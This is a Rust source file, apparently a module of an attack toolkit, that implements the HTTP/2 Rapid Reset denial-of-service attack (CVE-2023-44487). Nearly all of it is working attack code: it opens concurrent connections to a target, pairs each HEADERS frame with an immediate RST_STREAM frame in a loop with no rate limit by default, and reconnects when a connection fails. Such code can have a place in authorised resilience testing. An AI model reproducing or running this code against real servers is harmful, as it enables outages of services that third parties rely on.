//! HTTP/2 Rapid Reset Attack (CVE-2023-44487)
//!
//! This attack exploits the HTTP/2 protocol's stream cancellation mechanism
//! to overwhelm servers with minimal client-side resources.
//!
//! The attack works by:
//! 1. Opening multiple HTTP/2 connections to the target
//! 2. On each connection, rapidly creating new streams
//! 3. Sending a HEADERS frame to start a request
//! 4. Immediately sending a RST_STREAM frame to cancel it
//! 5. Repeating at extremely high rates (millions per second)
//!
//! Each HEADERS+RST_STREAM pair forces the server to allocate and immediately
//! deallocate stream state, consuming CPU and memory resources.

use std::sync::Arc;
use std::time::{Duration, Instant};

use async_trait::async_trait;
use anyhow::Context;
use bytes::Bytes;
use governor::{RateLimiter, Quota};
use phoenix_core::{RawH2Connection, frame::minimal_hpack_get_request};
use phoenix_metrics::AttackMetrics;
use tokio::task::JoinSet;
use tracing::{info, warn, error};
use url::Url;

use crate::{Attack, AttackContext, AttackError, AttackResult, parse_target, create_rate_limiter};

/// HTTP/2 Rapid Reset Attack implementation
pub struct RapidResetAttack {
    /// Number of concurrent connections (default: 10)
    connections: usize,
    
    /// Requests per second limit (None = unlimited)
    rps: Option<u32>,
    
    /// Attack duration
    duration: Duration,
}

impl RapidResetAttack {
    /// Create a new RapidResetAttack with default configuration
    pub fn new() -> Self {
        Self {
            connections: 10,
            rps: None,
            duration: Duration::from_secs(30),
        }
    }
    
    /// Set the number of concurrent connections
    pub fn with_connections(mut self, connections: usize) -> Self {
        self.connections = connections;
        self
    }
    
    /// Set the requests per second limit
    pub fn with_rps(mut self, rps: Option<u32>) -> Self {
        self.rps = rps;
        self
    }
    
    /// Set the attack duration
    pub fn with_duration(mut self, duration: Duration) -> Self {
        self.duration = duration;
        self
    }
    
    /// Execute the attack on a single connection
    async fn attack_connection(
        &self,
        target_host: String,
        target_port: u16,
        connection_id: usize,
        rate_limiter: Option<Arc<governor::RateLimiter<governor::state::NotKeyed, governor::state::InMemoryState, governor::clock::QuantaClock>>>,
        metrics: Arc<AttackMetrics>,
        start_time: Instant,
        duration: Duration,
    ) -> Result<(u64, u64), AttackError> {
        let mut total_requests = 0u64;
        let mut errors = 0u64;
        
        // Connect to target - construct URL from host and port
        let url_str = format!("https://{}:{}", target_host, target_port);
        let url = Url::parse(&url_str).map_err(|e| AttackError::Config(format!("Invalid URL: {}", e)))?;
        
        let mut connection = match RawH2Connection::connect(&url).await {
            Ok(conn) => conn,
            Err(e) => {
                error!("Connection {} failed to connect: {}", connection_id, e);
                return Ok((0, 1));
            }
        };
        
        info!("Connection {} established to {}:{}", connection_id, target_host, target_port);
        
        // Perform TLS and HTTP/2 handshake
        if let Err(e) = connection.perform_handshake().await {
            error!("Connection {} handshake failed: {}", connection_id, e);
            return Ok((0, 1));
        }
        
        let mut next_stream_id = 1u32; // Client-initiated streams are odd-numbered
        
        // Attack loop
        while start_time.elapsed() < duration {
            // Apply rate limiting if configured
            if let Some(limiter) = &rate_limiter {
                if limiter.check().is_err() {
                    tokio::time::sleep(tokio::time::Duration::from_millis(1)).await;
                    continue;
                }
            }
            
            let stream_id = next_stream_id;
            next_stream_id = next_stream_id.wrapping_add(2);
            
            // Build minimal GET request headers
            let headers_frame = minimal_hpack_get_request(&target_host, "/").into();
            
            // Send HEADERS frame (end_stream=false, end_headers=true)
            if let Err(e) = connection.send_frame(headers_frame).await {
                error!("Failed to send HEADERS frame: {}", e);
                errors += 1;
                
                // Try to reconnect
                let url_str = format!("https://{}:{}", target_host, target_port);
                let url = match Url::parse(&url_str) {
                    Ok(url) => url,
                    Err(e) => {
                        error!("Invalid URL during reconnection: {}", e);
                        return Ok((total_requests, errors));
                    }
                };
                
                match RawH2Connection::connect(&url).await {
                    Ok(new_conn) => {
                        connection = new_conn;
                        if let Err(e) = connection.perform_handshake().await {
                            error!("Reconnection handshake failed: {}", e);
                            break;
                        }
                    }
                    Err(e) => {
                        error!("Reconnection failed: {}", e);
                        break;
                    }
                }
                continue;
            }
            
            // Build RST_STREAM frame
            let rst_frame = build_rst_stream_frame(stream_id);
            
            // Send RST_STREAM frame immediately
            if let Err(e) = connection.send_frame(rst_frame).await {
                error!("Failed to send RST_STREAM frame: {}", e);
                errors += 1;
                continue;
            }
            
            total_requests += 1;
            metrics.record_request(0, true, 0).await;
            
            // Small yield to prevent starving the runtime
            if total_requests % 1000 == 0 {
                tokio::task::yield_now().await;
            }
        }
        
        Ok((total_requests, errors))
    }
}

/// Build a RST_STREAM frame
fn build_rst_stream_frame(stream_id: u32) -> Bytes {
    use bytes::BufMut;
    
    let mut buf = bytes::BytesMut::with_capacity(13);
    
    // Frame length: 4 bytes for error code
    buf.put_u32(4);
    
    // Frame type: RST_STREAM (0x03)
    buf.put_u8(0x03);
    
    // Flags: none
    buf.put_u8(0x00);
    
    // Stream identifier
    buf.put_u32(stream_id);
    
    // Error code: NO_ERROR (0x00)
    buf.put_u32(0x00);
    
    buf.freeze()
}

#[async_trait]
impl Attack for RapidResetAttack {
    fn name(&self) -> &str {
        "http2-rapid-reset"
    }
    
    fn description(&self) -> &str {
        "HTTP/2 Rapid Reset Attack (CVE-2023-44487). Sends HEADERS frames followed immediately by RST_STREAM frames to overwhelm servers with minimal client resources."
    }
    
    async fn run(&self, ctx: AttackContext) -> Result<AttackResult, AttackError> {
        info!("Starting HTTP/2 Rapid Reset Attack against {}", ctx.target);
        
        let (target_host, target_port) = parse_target(&ctx.target)?;
        
        // Use context values if provided, otherwise use struct defaults
        let connections = if ctx.connections > 0 { ctx.connections } else { self.connections };
        let rps = ctx.rps.or(self.rps);
        let duration = if ctx.duration.as_secs() > 0 { ctx.duration } else { self.duration };
        
        info!("Configuration: {} connections, RPS: {:?}, duration: {:?}", 
              connections, rps, duration);
        
        let metrics = ctx.metrics.clone();
        let start_time = Instant::now();
        
        // Create rate limiter if RPS is specified
        let rate_limiter = create_rate_limiter(rps).map(Arc::new);
        
        // Launch attack tasks
        let mut tasks = JoinSet::new();
        for i in 0..connections {
            let target_host = target_host.clone();
            let rate_limiter = rate_limiter.clone();
            let metrics = metrics.clone();
            let start_time = start_time;
            
            tasks.spawn(async move {
                let attack = RapidResetAttack::new();
                attack.attack_connection(
                    target_host,
                    target_port,
                    i,
                    rate_limiter,
                    metrics,
                    start_time,
                    duration,
                ).await
            });
        }
        
        // Collect results
        let mut total_requests = 0u64;
        let mut total_errors = 0u64;
        
        while let Some(result) = tasks.join_next().await {
            match result {
                Ok(Ok((requests, errors))) => {
                    total_requests += requests;
                    total_errors += errors;
                }
                Ok(Err(e)) => {
                    error!("Attack task failed: {}", e);
                    total_errors += 1;
                }
                Err(e) => {
                    error!("Task panicked: {}", e);
                    total_errors += 1;
                }
            }
        }
        
        let actual_duration = start_time.elapsed();
        let snapshot = metrics.snapshot().await;
        
        info!("Attack completed: {} requests, {} errors, duration: {:?}", 
              total_requests, total_errors, actual_duration);
        
        Ok(AttackResult {
            success: true,
            total_requests,
            errors: total_errors,
            duration: actual_duration,
            snapshot,
        })
    }
}

impl Default for RapidResetAttack {
    fn default() -> Self {
        Self::new()
    }
}